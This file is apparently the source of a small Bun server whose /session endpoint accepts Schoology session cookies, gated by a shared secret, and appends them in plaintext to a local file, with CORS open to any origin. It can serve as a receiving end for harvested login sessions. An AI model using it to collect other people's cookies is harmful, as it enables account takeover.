import { env } from "bun";
import { Data, Effect, pipe } from "effect";
import z from "zod";
import { existsSync, mkdirSync, appendFileSync } from "fs";

if (!env.PORT) {
  throw new Error('PORT is not set');
}

if (!env.SESSION_SECRET) {
  throw new Error('SESSION_SECRET is not set');
}

if (!existsSync('cfg')) {
  mkdirSync('cfg');
}

class JSONError extends Data.TaggedError("JSONError") {}

Bun.serve({
  port: Number(env.PORT),
  fetch: async (request, server) => Effect.runPromise(
    pipe(
      Effect.gen(function* () {
        const url = new URL(request.url);

        if (request.method === "OPTIONS") {
          return new Response(null, {
            status: 204,
            headers: {
              "Access-Control-Allow-Origin": "*",
              "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
              "Access-Control-Allow-Headers": "Content-Type,Authorization",
              "Access-Control-Max-Age": "86400"
            }
          });
        }

        if (url.pathname === '/') {
          return new Response('Hello World', {
            headers: {
              "Access-Control-Allow-Origin": "*"
            }
          });
        }

        if (url.pathname === '/session') {
          if (request.method !== 'POST') {
            return new Response('Method not allowed', {
              status: 405,
              headers: {
                "Access-Control-Allow-Origin": "*"
              }
            });
          }

          const body = yield* Effect.tryPromise({
            try: async () => {
              const schema = z.object({
                cookies: z.array(z.object({
                  name: z.string(),
                  value: z.string()
                })),
                serverToken: z.string()
              });
              return schema.safeParse(await request.json());
            },
            catch: (e) => new JSONError()
          });
          if (!body.success) {
            return new Response('Bad Request', {
              status: 400,
              headers: {
                "Access-Control-Allow-Origin": "*"
              }
            });
          }
          const { cookies, serverToken } = body.data;

          if (env.SESSION_SECRET !== serverToken) {
            return new Response('Unauthorized', {
              status: 401,
              headers: {
                "Access-Control-Allow-Origin": "*"
              }
            });
          }

          const timestamp = new Date().toISOString();
          const cookieLines = cookies.map(c => `${c.name}=${c.value}`).join('\n');
          const entry = `--- ${timestamp} ---\n${cookieLines}\n\n`;

          appendFileSync('cfg/schoology-cookies.txt', entry);
          console.log(`Received ${cookies.length} SESS cookies at ${timestamp}`);

          return new Response('OK', {
            headers: {
              "Access-Control-Allow-Origin": "*"
            }
          });
        }
        return new Response('Not Found', {
          status: 404,
          headers: {
            "Access-Control-Allow-Origin": "*"
          }
        });
      }),
      Effect.catchTags({
        JSONError: () => Effect.succeed(new Response('Bad Request', {
          status: 400,
          headers: {
            "Access-Control-Allow-Origin": "*"
          }
        }))
      })
    )
  )
})

console.log('Server is running on port ' + env.PORT);
